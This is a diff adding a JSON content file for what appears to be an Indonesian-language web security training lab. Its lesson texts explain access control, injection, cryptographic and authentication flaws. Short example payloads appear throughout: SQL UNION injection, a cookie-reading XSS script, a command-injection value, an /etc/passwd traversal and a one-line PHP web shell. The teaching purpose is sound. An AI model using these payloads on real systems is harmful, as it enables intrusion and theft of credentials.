@@ -1,0 +1,3093 @@
+{
+  "categories": [
+    {
+      "title": "Broken Access Control",
+      "paragraphs": [
+        "Terjadi ketika aplikasi gagal memastikan bahwa pengguna hanya bisa mengakses data atau fungsi yang menjadi haknya. Akibatnya, pengguna biasa bisa mengakses data pengguna lain, atau bahkan fungsi khusus admin.",
+        "Contoh sederhana: URL /invoice?id=1001 menampilkan invoice milik kita. Jika kita ubah manual menjadi /invoice?id=1002 dan ternyata bisa melihat invoice milik orang lain tanpa otorisasi, itu disebut Insecure Direct Object Reference (IDOR), salah satu bentuk Broken Access Control.",
+        "Lab hari ini mencakup tiga variasi Broken Access Control yang paling sering ditemukan di dunia nyata: Insecure Direct Object Reference (IDOR) (server mempercayai ID/identifier dari client tanpa mengecek kepemilikan), Broken Function-Level Access Control (user biasa bisa menjalankan fungsi yang seharusnya khusus admin - vertical privilege escalation), dan Cross-Site Request Forgery (CSRF) (aksi yang mengubah state dipicu diam-diam oleh halaman pihak ketiga, memanfaatkan sesi korban yang sedang login)."
+      ],
+      "id": "a01-access-control"
+    },
+    {
+      "title": "Security Misconfiguration",
+      "paragraphs": [
+        "Terjadi saat server, framework, database, atau layanan cloud dikonfigurasi secara tidak aman - biasanya karena memakai pengaturan bawaan (default) tanpa dikeraskan (hardening).",
+        "Contoh sederhana: Mode debug Laravel/Django masih aktif di production sehingga error menampilkan detail source code dan environment variable (termasuk password database) ke publik.",
+        "Lab hari ini mencakup empat variasi Security Misconfiguration: Security Misconfiguration umum (debug mode, kredensial default, directory listing, debug endpoint tertinggal, CORS, header keamanan hilang), Exposed VCS/Config Files (folder .git, file .env, backup editor yang ikut ter-deploy ke webroot), Cookie Security Misconfiguration (atribut HttpOnly/Secure/SameSite yang dilewatkan), dan Insecure HTTP Methods (method TRACE/PUT yang seharusnya dimatikan tapi tetap aktif)."
+      ],
+      "id": "a02-security-misconfiguration"
+    },
+    {
+      "title": "Software Supply Chain Failures",
+      "paragraphs": [
+        "Aplikasi modern bergantung pada ratusan library pihak ketiga dan pipeline CI/CD otomatis. Jika salah satu mata rantai ini disusupi, aplikasi ikut terdampak walau kode yang kita tulis sendiri aman.",
+        "Contoh sederhana: Penyerang mengunggah paket npm dengan nama mirip library populer (typosquatting, mis. expres alih-alih express); developer yang salah ketik saat install tanpa sadar menjalankan kode berbahaya tersebut.",
+        "Lab hari ini mencakup tiga variasi Software Supply Chain Failures: Software Supply Chain Failures umum (Prototype Pollution, dependency confusion, secret CI/CD ter-expose, auto-update tanpa verifikasi, postinstall berbahaya), Malicious/Compromised Package Content (typosquatting, missing SRI pada skrip CDN, lockfile yang tidak ditegakkan), dan Unpinned/Mutable Build References (CI Action & base image container yang dipin ke tag mutable, bukan SHA/digest immutable)."
+      ],
+      "id": "a03-software-supply-chain-failures"
+    },
+    {
+      "title": "Cryptographic Failures",
+      "paragraphs": [
+        "Terjadi saat data sensitif (password, kartu kredit, data pribadi) disimpan atau dikirim tanpa enkripsi yang memadai, atau memakai algoritma yang sudah usang.",
+        "Contoh sederhana: Password pengguna disimpan sebagai MD5 tanpa salt di database. Jika database bocor, hash MD5 tanpa salt sangat mudah di-crack menjadi password asli.",
+        "Lab hari ini mencakup empat variasi Cryptographic Failures: Weak Password Hashing (penyimpanan password yang mudah dipulihkan ke bentuk asli), Insecure Randomness (token/ID/kode yang seharusnya tidak bisa ditebak ternyata deterministik), Sensitive Data Exposure (data sensitif bocor lewat URL, cache, atau response yang tidak konsisten), dan JWT Vulnerabilities (token JSON Web Token yang tidak diverifikasi dengan aman)."
+      ],
+      "id": "a04-cryptographic-failures"
+    },
+    {
+      "title": "Injection",
+      "paragraphs": [
+        "Injection terjadi ketika aplikasi mengirim data yang tidak tepercaya (input dari pengguna) ke sebuah interpreter - misalnya database (SQL), browser (HTML/JavaScript), atau shell sistem operasi - dan data tersebut ikut ditafsirkan sebagai bagian dari perintah/kode, bukan sekadar data biasa.",
+        "Contoh sederhana: Sebuah form login membangun query seperti ini secara langsung dari input pengguna:"
+      ],
+      "id": "a05-injection"
+    },
+    {
+      "title": "Insecure Design",
+      "paragraphs": [
+        "Berbeda dari kesalahan implementasi, Insecure Design adalah kelemahan yang sudah tertanam sejak tahap perancangan alur/fitur aplikasi - sehingga tidak bisa diperbaiki hanya dengan menambal kode, melainkan perlu didesain ulang.",
+        "Contoh sederhana: Fitur \"lupa password\" mengirim kode OTP 4 digit tanpa batas percobaan (rate limiting), sehingga penyerang bisa mencoba 10.000 kombinasi dengan cepat sampai berhasil.",
+        "Lab hari ini mencakup tiga variasi business logic vulnerabilities: Business Logic Vulnerabilities umum (price tampering, negative quantity, coupon stacking, skip step checkout, referral abuse), Flawed Multi-Step Authentication Logic (2FA yang bisa dilewati lewat forced browsing, ganti password tanpa re-autentikasi, trusted device yang gampang dipalsukan), dan Business Rule Enforcement Gaps (HTTP Parameter Pollution pada kupon, price spoofing lewat header region, over-refund) - semuanya kode \"berjalan sesuai spek\", tapi speknya sendiri yang cacat."
+      ],
+      "id": "a06-insecure-design"
+    },
+    {
+      "title": "Authentication Failures",
+      "paragraphs": [
+        "Mencakup segala kelemahan pada proses memverifikasi identitas pengguna dan menjaga sesi login mereka tetap aman setelahnya.",
+        "Contoh sederhana: Setelah pengguna menekan \"Logout\", session token lama masih tetap valid dan bisa dipakai untuk mengakses akun jika tokennya berhasil dicuri sebelumnya.",
+        "Lab hari ini mencakup empat variasi Authentication Failures: Username Enumeration (form login membocorkan validitas username lewat pesan/waktu/perilaku), Broken Brute-Force Protection (rate limiting/lockout yang tidak memadai atau bisa dilewati), Broken Session Management (token sesi yang tidak dikelola dengan aman), dan Password Reset Flaws (alur reset password yang cacat)."
+      ],
+      "id": "a07-authentication-failures"
+    },
+    {
+      "title": "Software or Data Integrity Failures",
+      "paragraphs": [
+        "Terjadi ketika aplikasi menerima update, plugin, atau data terserialisasi dari sumber luar tanpa memverifikasi keasliannya (mis. lewat digital signature), sehingga rentan dimanipulasi.",
+        "Contoh sederhana: Aplikasi men-deserialisasi objek PHP/Java dari cookie pengguna secara langsung. Objek yang dimanipulasi bisa memicu eksekusi kode saat proses deserialisasi (insecure deserialization).",
+        "Lab hari ini mencakup tiga variasi Software or Data Integrity Failures: Data & Software Integrity Failures umum (PHP Object Injection, state cookie tanpa signature, timing attack pada signature, update tanpa checksum), Broken Integrity Verification Mechanisms (magic hash/type juggling, secret signing bocor, signature yang cuma menutupi sebagian data, checksum dari sumber tidak independen), dan Untrusted Input Shaping Program State (variable injection lewat extract(), dynamic dispatch dari input tak tepercaya)."
+      ],
+      "id": "a08-software-data-integrity-failures"
+    },
+    {
+      "title": "Logging & Alerting Failures",
+      "paragraphs": [
+        "Tanpa log dan alert yang memadai, tim keamanan tidak akan tahu bahwa sedang atau sudah terjadi serangan, sehingga respons insiden menjadi sangat lambat - bahkan bisa baru diketahui berbulan-bulan kemudian.",
+        "Contoh sederhana: Ada 50.000 percobaan login gagal ke satu akun dalam semalam, tapi tidak ada log maupun notifikasi apa pun yang terpicu ke tim keamanan.",
+        "Lab hari ini mencakup dua variasi Logging & Alerting Failures: Logging & Alerting Failures umum (log injection/forgery, log injection ke Stored XSS, tidak ada alert brute-force, data sensitif di log), dan Alerting & Log Integrity Gaps (threshold alert yang bisa dievasi lewat pacing, audit log yang bisa dihapus user biasa, kebocoran lewat console.log di browser, dan log yang ada tapi kurang konteks untuk investigasi)."
+      ],
+      "id": "a09-logging-alerting-failures"
+    },
+    {
+      "title": "Mishandling of Exceptional Conditions",
+      "paragraphs": [
+        "Terjadi ketika aplikasi tidak menangani error, input tak terduga, atau kegagalan komponen lain dengan benar - sehingga informasi sensitif bocor atau alur keamanan bisa dilewati saat sistem berada dalam kondisi tidak normal.",
+        "Contoh sederhana: Saat koneksi ke layanan verifikasi pembayaran gagal/timeout, aplikasi \"fail open\" dan tetap menganggap transaksi berhasil, alih-alih menolaknya.",
+        "Lab hari ini mencakup dua variasi Mishandling of Exceptional Conditions: Mishandling of Exceptional Conditions umum (fail-open saat timeout, error message bocor, race condition, fail-open di blok catch), dan Non-Atomic & Type-Unsafe Exceptional Handling (retry yang menyebabkan double charge, transaksi multi-step tanpa rollback, filter in_array() yang bisa dilewati lewat tipe data tak terduga, dan fail-open dari response API yang gagal di-parse)."
+      ],
+      "id": "a10-mishandling-exceptional-conditions"
+    }
+  ],
+  "topics": [
+    {
+      "title": "Insecure Direct Object Reference (IDOR)",
+      "paragraphs": [
+        "IDOR terjadi ketika aplikasi mengambil/mengubah data berdasarkan identifier (ID, token, nama file) yang dikirim langsung oleh client, tanpa memverifikasi bahwa data tersebut memang milik user yang sedang login.",
+        "Contoh sederhana: GET /invoice?id=5001 menampilkan invoice kita. Mengubah jadi id=5002 dan tetap bisa melihat invoice user lain adalah bukti IDOR."
+      ],
+      "id": "idor",
+      "category": "a01-access-control"
+    },
+    {
+      "title": "Broken Function-Level Access Control",
+      "paragraphs": [
+        "Terjadi ketika aplikasi lupa memverifikasi role/permission sebelum menjalankan fungsi sensitif - dikenal juga sebagai vertical privilege escalation.",
+        "Contoh sederhana: halaman /admin hanya mengecek \"apakah sudah login\", bukan \"apakah role-nya admin\"."
+      ],
+      "id": "broken-function-access",
+      "category": "a01-access-control"
+    },
+    {
+      "title": "Cross-Site Request Forgery (CSRF)",
+      "paragraphs": [
+        "CSRF memanfaatkan fakta bahwa browser otomatis menyertakan cookie session ke setiap request ke suatu domain, terlepas dari halaman mana yang memicu request itu. Tanpa proteksi tambahan, halaman attacker bisa memaksa browser korban mengirim request \"atas nama\" korban."
+      ],
+      "id": "csrf",
+      "category": "a01-access-control"
+    },
+    {
+      "title": "Security Misconfiguration",
+      "paragraphs": [
+        "Beda dari bug di kode aplikasi, Security Misconfiguration adalah kesalahan pada pengaturan - server, framework, atau layanan yang dikonfigurasi longgar (atau dibiarkan memakai default) sehingga membuka celah yang sebetulnya mudah dicegah lewat hardening dasar."
+      ],
+      "id": "misconfig",
+      "category": "a02-security-misconfiguration"
+    },
+    {
+      "title": "Exposed VCS / Config Files",
+      "paragraphs": [
+        "Folder version control (.git), file konfigurasi (.env), dan file backup editor sering ikut ter-deploy ke webroot production tanpa disadari - dan karena web server tidak memblokir dotfile/nama file semacam ini secara default, semuanya tetap bisa diakses langsung lewat URL."
+      ],
+      "id": "exposed-vcs",
+      "category": "a02-security-misconfiguration"
+    },
+    {
+      "title": "Cookie Security Misconfiguration",
+      "paragraphs": [
+        "Cookie sesi/autentikasi punya tiga atribut keamanan yang seharusnya selalu dipasang: HttpOnly (blokir akses lewat JavaScript), Secure (hanya lewat HTTPS), dan SameSite (kontrol pengiriman lintas situs). Melewatkan salah satunya melemahkan lapisan pertahanan yang sebetulnya murah untuk dipasang."
+      ],
+      "id": "cookie-misconfig",
+      "category": "a02-security-misconfiguration"
+    },
+    {
+      "title": "Insecure HTTP Methods",
+      "paragraphs": [
+        "Web server dan aplikasi PHP secara default tetap memproses method HTTP seperti TRACE dan PUT kecuali dimatikan/dibatasi secara eksplisit - keduanya jarang benar-benar dibutuhkan aplikasi, tapi kalau aktif membuka attack surface baru di luar form/endpoint yang dimaksudkan developer."
+      ],
+      "id": "http-methods",
+      "category": "a02-security-misconfiguration"
+    },
+    {
+      "title": "Software Supply Chain Failures",
+      "paragraphs": [
+        "Rantai suplai software modern melibatkan banyak pihak yang tidak sepenuhnya di bawah kendali developer: registry package publik, pipeline CI/CD, dan komponen pihak ketiga. Kompromi di salah satu mata rantai ini berdampak ke aplikasi meski kode sendiri tidak punya bug apa pun."
+      ],
+      "id": "supply-chain",
+      "category": "a03-software-supply-chain-failures"
+    },
+    {
+      "title": "Malicious / Compromised Package Content",
+      "paragraphs": [
+        "Bukan cuma soal registry mana yang dipakai - nama paket yang disamarkan (typosquatting), sumber eksternal yang tidak diverifikasi (missing SRI), dan lockfile yang tidak ditegakkan semuanya membuat konten yang benar-benar terpasang/dijalankan berbeda dari yang dipercaya developer."
+      ],
+      "id": "malicious-package-content",
+      "category": "a03-software-supply-chain-failures"
+    },
+    {
+      "title": "Unpinned / Mutable Build References",
+      "paragraphs": [
+        "Tag seperti @v1 atau :latest hanyalah pointer yang bisa dipindahkan kapan saja oleh siapa pun yang punya akses ke sumbernya - referensi immutable (commit SHA, digest) menjamin konten yang berjalan selalu persis yang pernah direview."
+      ],
+      "id": "unpinned-build-references",
+      "category": "a03-software-supply-chain-failures"
+    },
+    {
+      "title": "Weak Password Hashing",
+      "paragraphs": [
+        "Password yang disimpan plaintext, di-hash dengan algoritma cepat tanpa salt (MD5/SHA1), atau cuma \"disamarkan\" (encoding) alih-alih benar-benar di-hash, membuat database yang bocor langsung membocorkan seluruh password penggunanya."
+      ],
+      "id": "weak-hashing",
+      "category": "a04-cryptographic-failures"
+    },
+    {
+      "title": "Insecure Randomness",
+      "paragraphs": [
+        "Menggunakan rand()/mt_rand() (bukan CSPRNG) atau men-seed generator dengan nilai publik (waktu, ID user) membuat \"nilai acak\" bisa dihitung ulang oleh siapa pun yang tahu inputnya."
+      ],
+      "id": "insecure-randomness",
+      "category": "a04-cryptographic-failures"
+    },
+    {
+      "title": "Sensitive Data Exposure",
+      "paragraphs": [
+        "Data sensitif bisa bocor bukan cuma karena enkripsi lemah, tapi juga lewat URL yang tercatat di banyak tempat, cache yang tidak dikontrol, atau response yang menampilkan lebih banyak data daripada seharusnya."
+      ],
+      "id": "sensitive-data-exposure",
+      "category": "a04-cryptographic-failures"
+    },
+    {
+      "title": "JWT Vulnerabilities",
+      "paragraphs": [
+        "JWT hanya seaman implementasi verifikasinya - kesalahan umum termasuk menerima algoritma none, secret HMAC yang lemah, tidak memverifikasi signature sama sekali, atau mempercayai header kid tanpa sanitasi."
+      ],
+      "id": "jwt",
+      "category": "a04-cryptographic-failures"
+    },
+    {
+      "title": "SQL Injection",
+      "paragraphs": [
+        "SQL Injection (SQLi) terjadi ketika input pengguna digabungkan langsung ke dalam query SQL tanpa disaring/di-parameterisasi, sehingga penyerang bisa mengubah logika query untuk membaca, mengubah, atau menghapus data yang seharusnya tidak bisa mereka akses - bahkan terkadang melewati proses login sama sekali.",
+        "Contoh sederhana: Halaman pencarian produk memakai query SELECT * FROM products WHERE id = $id. Jika parameter id diisi 0 UNION SELECT username, password FROM users, hasil pencarian produk akan tercampur dengan data akun pengguna dari tabel lain."
+      ],
+      "id": "sqli",
+      "category": "a05-injection"
+    },
+    {
+      "title": "Cross-Site Scripting (XSS)",
+      "paragraphs": [
+        "XSS terjadi ketika input pengguna ditampilkan kembali ke halaman HTML tanpa di-encode dengan benar, sehingga browser korban ikut mengeksekusinya sebagai kode, bukan sekadar teks. Dampaknya bisa mencuri cookie/sesi, mengambil alih akun, atau mengubah tampilan halaman untuk phishing.",
+        "Contoh sederhana: Kolom komentar menampilkan input apa adanya: <script>alert(document.cookie)</script>. Setiap orang yang membuka halaman tersebut akan menjalankan script itu di browser mereka."
+      ],
+      "id": "xss",
+      "category": "a05-injection"
+    },
+    {
+      "title": "OS Command Injection",
+      "paragraphs": [
+        "Command Injection terjadi ketika aplikasi memanggil perintah shell sistem operasi (mis. ping, curl) dan menggabungkan input pengguna langsung ke dalam perintah tersebut. Metakarakter shell seperti ; | & bisa dipakai untuk menjalankan perintah tambahan di luar yang dimaksud aplikasi.",
+        "Contoh sederhana: Fitur \"ping\" menjalankan ping -c 2 $host. Jika host diisi 127.0.0.1; whoami, shell akan menjalankan dua perintah sekaligus: ping, lalu whoami."
+      ],
+      "id": "command-injection",
+      "category": "a05-injection"
+    },
+    {
+      "title": "Local File Inclusion (LFI)",
+      "paragraphs": [
+        "LFI (Local File Inclusion) terjadi ketika aplikasi memasukkan nama/path file dari input pengguna langsung ke fungsi seperti include() atau require() tanpa validasi memadai. Penyerang bisa memanfaatkannya untuk membaca file sensitif di server (path traversal), dan pada kasus yang lebih parah, menaikkannya jadi eksekusi kode (RCE) lewat PHP stream wrapper atau log poisoning.",
+        "Contoh sederhana: Halaman menampilkan konten lewat include($_GET['page'] . '.php'). Jika parameter page diisi ../../../../etc/passwd%00 (pada sistem lama) atau cukup ../../../../etc/passwd (tanpa ekstensi dipaksakan), isi file sistem bisa ikut ditampilkan."
+      ],
+      "id": "lfi",
+      "category": "a05-injection"
+    },
+    {
+      "title": "File Upload Vulnerabilities",
+      "paragraphs": [
+        "Kerentanan File Upload terjadi ketika aplikasi mengizinkan pengguna meng-upload file tanpa memvalidasi jenis, isi, atau lokasi penyimpanannya dengan benar. Jika penyerang berhasil menaruh file berisi kode (mis. skrip PHP) ke direktori yang bisa dieksekusi web server, hasilnya adalah Remote Code Execution (RCE) penuh lewat \"web shell\".",
+        "Contoh sederhana: Fitur upload avatar hanya mengecek ekstensi file dari nama yang dikirim, tanpa memeriksa isi sebenarnya. Jika penyerang meng-upload shell.php berisi <?php system($_GET['cmd']); ?> dan file tersebut tersimpan di folder yang bisa diakses langsung, mengunjungi shell.php?cmd=id akan menjalankan perintah sistem operasi."
+      ],
+      "id": "file-upload",
+      "category": "a05-injection"
+    },
+    {
+      "title": "Business Logic Vulnerabilities",
+      "paragraphs": [
+        "Kerentanan desain tidak selalu berupa bug teknis seperti injection - seringkali aplikasi berjalan persis seperti yang diprogram, tapi asumsi di balik alur bisnisnya (harga selalu dari server, kuantitas selalu positif, kupon cuma sekali pakai, langkah checkout harus berurutan, satu orang cuma daftar sekali) tidak pernah benar-benar ditegakkan."
+      ],
+      "id": "business-logic",
+      "category": "a06-insecure-design"
+    },
+    {
+      "title": "Flawed Multi-Step Authentication Logic",
+      "paragraphs": [
+        "Login bertahap (password lalu 2FA) melibatkan beberapa komponen yang masing-masing terlihat benar sendiri-sendiri - flag session, token \"trusted device\", form ganti password - tapi urutan/penegakannya di server tidak konsisten, membuka celah untuk melewati faktor kedua sepenuhnya."
+      ],
+      "id": "flawed-auth-workflow",
+      "category": "a06-insecure-design"
+    },
+    {
+      "title": "Business Rule Enforcement Gaps",
+      "paragraphs": [
+        "\"Satu kupon sekali pakai per request\", \"harga sesuai region asli\", \"refund tidak boleh melebihi pembelian\" - aturan-aturan ini terdengar jelas, tapi tidak satu pun ditegakkan lewat validasi nyata di server."
+      ],
+      "id": "business-rule-enforcement-gaps",
+      "category": "a06-insecure-design"
+    },
+    {
+      "title": "Username Enumeration",
+      "paragraphs": [
+        "Sekali username tervalidasi lewat pesan error, panjang response, waktu respons, atau perilaku lockout, serangan berikutnya (password spraying, brute force terarah) jadi jauh lebih efisien."
+      ],
+      "id": "username-enumeration",
+      "category": "a07-authentication-failures"
+    },
+    {
+      "title": "Broken Brute-Force Protection",
+      "paragraphs": [
+        "Proteksi brute-force yang lemah membuat penebakan password otomatis jadi praktis, baik karena tidak ada limit sama sekali maupun karena limit yang ada bisa dihindari."
+      ],
+      "id": "brute-force-protection",
+      "category": "a07-authentication-failures"
+    },
+    {
+      "title": "Broken Session Management",
+      "paragraphs": [
+        "Mencakup token yang tidak di-invalidate saat logout, token yang bisa ditebak, session fixation, dan token yang bocor lewat kanal yang tidak seharusnya."
+      ],
+      "id": "session-management",
+      "category": "a07-authentication-failures"
+    },
+    {
+      "title": "Password Reset Flaws",
+      "paragraphs": [
+        "Kesalahan umum pada fitur reset password: token/kode yang bocor, bisa dipakai ulang, terlalu mudah ditebak, atau link reset yang dibangun dari input tak tepercaya."
+      ],
+      "id": "password-reset",
+      "category": "a07-authentication-failures"
+    },
+    {
+      "title": "Data & Software Integrity Failures",
+      "paragraphs": [
+        "Integritas berarti memastikan data/kode yang diterima benar-benar berasal dari sumber yang sah dan tidak dimodifikasi di tengah jalan. Tanpa mekanisme verifikasi (signature, checksum yang benar-benar dicek) data client-side - cookie, file upload, paket update - bisa dimanipulasi bebas."
+      ],
+      "id": "integrity",
+      "category": "a08-software-data-integrity-failures"
+    },
+    {
+      "title": "Broken Integrity Verification Mechanisms",
+      "paragraphs": [
+        "Beda dari kategori dasar di atas (yang sama sekali tidak punya mekanisme verifikasi), lab-lab ini menunjukkan bahwa PUNYA signature/checksum/hash comparison saja tidak cukup - kelemahan tipe data, secret yang bocor, cakupan signature yang tidak lengkap, dan sumber pembanding yang tidak independen semuanya bisa membuat mekanisme yang \"terlihat benar\" tetap gagal melindungi apa pun."
+      ],
+      "id": "broken-integrity-verification",
+      "category": "a08-software-data-integrity-failures"
+    },
+    {
+      "title": "Untrusted Input Shaping Program State",
+      "paragraphs": [
+        "Bukan cuma data biasa yang dipercaya begitu saja dari input pengguna - nama variabel internal, bahkan kode apa yang dijalankan, ikut ditentukan oleh apa yang dikirim client."
+      ],
+      "id": "untrusted-input-shaping-state",
+      "category": "a08-software-data-integrity-failures"
+    },
+    {
+      "title": "Logging & Alerting Failures",
+      "paragraphs": [
+        "Logging yang buruk bukan cuma soal \"tidak ada log\" - log yang menulis input mentah tanpa sanitasi, dashboard yang merendernya tanpa encoding, atau log yang menyimpan data sensitif apa adanya semuanya sama-sama berbahaya."
+      ],
+      "id": "logging",
+      "category": "a09-logging-alerting-failures"
+    },
+    {
+      "title": "Alerting & Log Integrity Gaps",
+      "paragraphs": [
+        "Beda dari kategori dasar di atas (yang sama sekali tidak punya log/alert), lab-lab ini menunjukkan bahwa PUNYA mekanisme logging/alerting saja tidak cukup - threshold yang bisa dievasi, log yang bisa dihapus pelakunya sendiri, kanal logging yang tidak disadari (browser console), dan log yang ada tapi tidak cukup detail semuanya membuat deteksi/investigasi tetap gagal walau \"terlihat\" sudah ada."
+      ],
+      "id": "alerting-log-integrity-gaps",
+      "category": "a09-logging-alerting-failures"
+    },
+    {
+      "title": "Mishandling of Exceptional Conditions",
+      "paragraphs": [
+        "Kode yang berjalan mulus untuk kasus normal seringkali punya asumsi tersembunyi yang tidak pernah diuji: bagaimana kalau layanan eksternal gagal? bagaimana kalau input di luar rentang yang diharapkan? bagaimana kalau dua request datang nyaris bersamaan? Default yang aman untuk semua kondisi ini adalah menolak, bukan meloloskan."
+      ],
+      "id": "exceptions",
+      "category": "a10-mishandling-exceptional-conditions"
+    },
+    {
+      "title": "Non-Atomic & Type-Unsafe Exceptional Handling",
+      "paragraphs": [
+        "Kondisi tak terduga bukan cuma soal exception yang melempar error - operasi yang di-retry tanpa idempotency, transaksi multi-step tanpa rollback, tipe data yang tidak divalidasi sebelum masuk logika filter, dan default value yang diam-diam menggantikan hasil pengecekan keamanan semuanya adalah bentuk lain dari penanganan kondisi tak terduga yang gagal."
+      ],
+      "id": "non-atomic-type-unsafe-handling",
+      "category": "a10-mishandling-exceptional-conditions"
+    }
+  ],
+  "lessons": [
+    {
+      "title": "Basic IDOR (baca data)",
+      "paragraphs": [
+        "Halaman \"invoice saya\" mengambil data lewat parameter id tanpa mengecek kepemilikan sama sekali.",
+        "Contoh payload: ?id=5002 saat login sebagai user pemilik invoice 5001."
+      ],
+      "id": "a01-access-control--idor--basic-read",
+      "category": "a01-access-control",
+      "topic": "idor",
+      "source_lab_status": 200,
+      "source_order": 0,
+      "source_hints": [],
+      "source_requires_login": true,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "IDOR pada aksi tulis",
+      "paragraphs": [
+        "Form update menyimpan ID target di hidden field yang bisa diubah bebas lewat DevTools/Burp sebelum submit, mengizinkan penulisan ke data milik user lain.",
+        "Contoh: ubah user_id=4 di request update profil untuk mengubah data akun admin."
+      ],
+      "id": "a01-access-control--idor--write",
+      "category": "a01-access-control",
+      "topic": "idor",
+      "source_lab_status": 200,
+      "source_order": 1,
+      "source_hints": [],
+      "source_requires_login": true,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "IDOR dengan ID tidak berurutan",
+      "paragraphs": [
+        "ID \"sulit ditebak\" (UUID/token acak) sering dianggap developer sebagai pengganti access control - padahal cuma obscurity. Begitu token bocor lewat kanal lain (log, feed aktivitas, dsb), data tetap bisa diakses siapa pun yang memilikinya."
+      ],
+      "id": "a01-access-control--idor--unpredictable-id",
+      "category": "a01-access-control",
+      "topic": "idor",
+      "source_lab_status": 200,
+      "source_order": 2,
+      "source_hints": [],
+      "source_requires_login": true,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "IDOR di endpoint API/JSON",
+      "paragraphs": [
+        "Endpoint yang dipanggil fetch() dari JavaScript bisa diakses langsung dan sering luput dari audit access control yang sama ketatnya dengan halaman HTML.",
+        "Contoh: ?api=1&id=4 mengembalikan password & kartu kredit user lain."
+      ],
+      "id": "a01-access-control--idor--api",
+      "category": "a01-access-control",
+      "topic": "idor",
+      "source_lab_status": 200,
+      "source_order": 3,
+      "source_hints": [],
+      "source_requires_login": true,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Mass Assignment",
+      "paragraphs": [
+        "Server melakukan array_merge($user, $_POST) tanpa allowlist field yang boleh diubah, sehingga field seperti role bisa diselundupkan lewat request meski tidak ada di form aslinya."
+      ],
+      "id": "a01-access-control--idor--mass-assignment",
+      "category": "a01-access-control",
+      "topic": "idor",
+      "source_lab_status": 200,
+      "source_order": 4,
+      "source_hints": [],
+      "source_requires_login": true,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Unprotected admin functionality",
+      "paragraphs": [
+        "Server hanya mengecek status login, tidak pernah mengecek role === admin."
+      ],
+      "id": "a01-access-control--broken-function-access--unprotected-admin",
+      "category": "a01-access-control",
+      "topic": "broken-function-access",
+      "source_lab_status": 200,
+      "source_order": 5,
+      "source_hints": [],
+      "source_requires_login": true,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Unprotected admin dengan URL \"tersembunyi\"",
+      "paragraphs": [
+        "Security through obscurity: URL tidak ada di menu manapun, tapi tercatat di robots.txt yang memang dipublikasikan untuk crawler."
+      ],
+      "id": "a01-access-control--broken-function-access--hidden-url",
+      "category": "a01-access-control",
+      "topic": "broken-function-access",
+      "source_lab_status": 200,
+      "source_order": 6,
+      "source_hints": [],
+      "source_requires_login": true,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Role ditentukan cookie client-writable",
+      "paragraphs": [
+        "Halaman membaca $_COOKIE['role'] alih-alih data user tervalidasi di server. Cookie non-HttpOnly bisa diubah lewat document.cookie."
+      ],
+      "id": "a01-access-control--broken-function-access--role-cookie",
+      "category": "a01-access-control",
+      "topic": "broken-function-access",
+      "source_lab_status": 200,
+      "source_order": 7,
+      "source_hints": [],
+      "source_requires_login": true,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Method-based access control bypass",
+      "paragraphs": [
+        "Tombol aksi disembunyikan di render GET, tapi handler yang benar-benar menjalankan aksi (POST) tidak pernah mengecek role."
+      ],
+      "id": "a01-access-control--broken-function-access--method-bypass",
+      "category": "a01-access-control",
+      "topic": "broken-function-access",
+      "source_lab_status": 200,
+      "source_order": 8,
+      "source_hints": [],
+      "source_requires_login": true,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Referer-based access control bypass",
+      "paragraphs": [
+        "Header Referer sepenuhnya dikendalikan client dan bisa dipalsukan lewat curl/Burp - bukan bukti otorisasi apa pun."
+      ],
+      "id": "a01-access-control--broken-function-access--referer-bypass",
+      "category": "a01-access-control",
+      "topic": "broken-function-access",
+      "source_lab_status": 200,
+      "source_order": 9,
+      "source_hints": [],
+      "source_requires_login": true,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Tidak ada token CSRF",
+      "paragraphs": [
+        "Server hanya mengandalkan cookie session yang valid, tanpa token CSRF sama sekali."
+      ],
+      "id": "a01-access-control--csrf--no-token",
+      "category": "a01-access-control",
+      "topic": "csrf",
+      "source_lab_status": 200,
+      "source_order": 10,
+      "source_hints": [],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Token CSRF tidak diikat ke session",
+      "paragraphs": [
+        "Attacker bisa mendapat token valid milik sendiri, lalu memakainya untuk memalsukan request atas nama korban."
+      ],
+      "id": "a01-access-control--csrf--token-not-tied",
+      "category": "a01-access-control",
+      "topic": "csrf",
+      "source_lab_status": 200,
+      "source_order": 11,
+      "source_hints": [],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Bypass dengan menghapus parameter token",
+      "paragraphs": [
+        "if (isset($_POST['csrf_token'])) - kalau parameter itu tidak ada sama sekali, validasi ter-skip begitu saja."
+      ],
+      "id": "a01-access-control--csrf--token-removal",
+      "category": "a01-access-control",
+      "topic": "csrf",
+      "source_lab_status": 200,
+      "source_order": 12,
+      "source_hints": [],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Aksi sensitif lewat GET request",
+      "paragraphs": [
+        "GET seharusnya safe method tanpa efek samping. Mengizinkan aksi sensitif lewat GET membuatnya bisa dipicu tanpa JavaScript maupun form sama sekali."
+      ],
+      "id": "a01-access-control--csrf--get-based",
+      "category": "a01-access-control",
+      "topic": "csrf",
+      "source_lab_status": 200,
+      "source_order": 13,
+      "source_hints": [],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Debug mode aktif membocorkan stack trace",
+      "paragraphs": [
